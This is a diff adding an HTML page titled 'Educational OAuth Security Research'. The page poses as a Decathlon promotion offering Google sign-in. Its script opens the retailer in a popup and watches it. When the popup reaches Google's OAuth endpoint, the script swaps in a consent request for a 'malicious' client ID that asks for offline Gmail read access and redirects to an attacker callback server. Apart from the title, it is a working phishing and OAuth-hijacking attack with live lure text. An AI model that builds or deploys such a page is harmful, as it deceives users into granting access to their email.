@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Educational OAuth Security Research</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .config-link {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            color: #999;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .config-link:hover {
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <!-- Decathlon Promotion Page Section -->
+    <div style="margin: 30px 0; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 2px 8px #eee; max-width: 500px; text-align: left;">
+        <h4 style="color:#0057b8; margin-bottom:8px;">Decathlon: Sports & Outdoor Promotion</h4>
+        <p style="font-size:15px; color:#333; margin-bottom:10px;">Discover the latest Decathlon promotions on sports and outdoor equipment. Click below to visit the official Decathlon promotion page and enjoy exclusive offers!</p>
+        <p style="font-size:14px; color:#555; margin-bottom:10px;">Sign in with Google OAuth for a seamless shopping experience.</p>
+        <a href="#" style="color:#0057b8; text-decoration:underline; font-weight:bold;" onclick="startAttack('https://www.decathlon.it'); return false;">Visit Decathlon Promotion</a>
+    </div>
+    
+    <a href="memory.html" class="config-link">Configure</a>
+    
+
+
+
+    <script>
+        // Hardcoded configuration for standalone use
+        const MALICIOUS_REDIRECT_URI = 'http://localhost:8080/callback';
+        const MALICIOUS_CLIENT_ID = 'malicious-client-id.apps.googleusercontent.com';
+        const ATTACKER_SERVER = 'http://localhost:8080';
+
+        let attackInProgress = false;
+        let targetWindow = null;
+
+        // Get URL parameters
+        function getUrlParams() {
+            const params = new URLSearchParams(window.location.search);
+            return {
+                url: params.get('url')
+            };
+        }
+
+
+        // Build a generic malicious OAuth URL
+        function buildGenericMaliciousOAuthUrl() {
+            const baseUrl = 'https://accounts.google.com/o/oauth2/v2/auth';
+            const params = new URLSearchParams({
+                client_id: MALICIOUS_CLIENT_ID,
+                redirect_uri: MALICIOUS_REDIRECT_URI,
+                response_type: 'code',
+                scope: 'openid email profile https://www.googleapis.com/auth/gmail.readonly',
+                state: generateState(),
+                access_type: 'offline',
+                prompt: 'consent'
+            });
+            return `${baseUrl}?${params.toString()}`;
+        }
+
+
+        // Generate a random state parameter
+        function generateState() {
+            const array = new Uint8Array(16);
+            crypto.getRandomValues(array);
+            return Array.from(array, b => b.toString(16).padStart(2, '0')).join('');
+        }
+
+
+        // Detect if URL is a Google OAuth endpoint
+        function isGoogleOAuthUrl(url) {
+            return url && url.startsWith('https://accounts.google.com/o/oauth2');
+        }
+
+        // Main Attack Method - Monitor the target window for OAuth redirects
+        function monitorTargetWindow() {
+            let hijackAttempted = false;
+            let pollCount = 0;
+            const checkInterval = setInterval(() => {
+                pollCount++;
+                try {
+                    if (!targetWindow || targetWindow.closed) {
+                        clearInterval(checkInterval);
+                        return;
+                    }
+                    let currentUrl = null;
+                    try {
+                        // Attempt to read the URL
+                        currentUrl = targetWindow.location.href;
+
+                        if (!hijackAttempted && isGoogleOAuthUrl(currentUrl)) {
+                            hijackAttempted = true;
+                            setTimeout(() => {
+                                targetWindow.location.replace(buildGenericMaliciousOAuthUrl());
+                            }, 100);
+                            clearInterval(checkInterval);
+                            return;
+                        }
+                    } catch (e) {
+                        // Backup flow using frame count based approach.
+                        try {
+                            const frameCount = targetWindow.frames.length;
+                            if (!hijackAttempted && frameCount === 2) {
+                                hijackAttempted = true;
+                                setTimeout(() => {
+                                    targetWindow.location.replace(buildGenericMaliciousOAuthUrl());
+                                }, 5000);
+                                clearInterval(checkInterval);
+                                return;
+                            }
+                        } catch (frameErr) {}
+                    }
+                } catch (err) {}
+                // Timeout after 10 minutes
+                if (pollCount > 60000) {
+                    clearInterval(checkInterval);
+                }
+            }, 10);
+        }
+
+        // Start the attack
+        function startAttack(targetUrl) {
+            if (attackInProgress) {
+                alert('Attack already in progress');
+                return;
+            }
+            attackInProgress = true;
+            targetWindow = window.open(targetUrl, 'target_app', 'width=600,height=700,left=100,top=100');
+            if (targetWindow) {
+                setTimeout(() => {
+                    monitorTargetWindow(); // MAIN ATTACK METHOD
+                }, 2000);
+            } else {
+                alert('Failed to open popup. Please allow popups for this site.');
+            }
+        }
+
+        // Only click handler: use ?url= param if present, else Decathlon
+        window.onload = function() {
+            const decathlonLink = document.querySelector('a[href="#"]');
+            if (decathlonLink) {
+                decathlonLink.onclick = function(e) {
+                    e.preventDefault();
+                    const urlParams = getUrlParams();
+                    const target = urlParams.url ? urlParams.url : 'https://www.decathlon.it';
+                    startAttack(target);
+                };
+            }
+        };
+    </script>
+</body>
+</html>
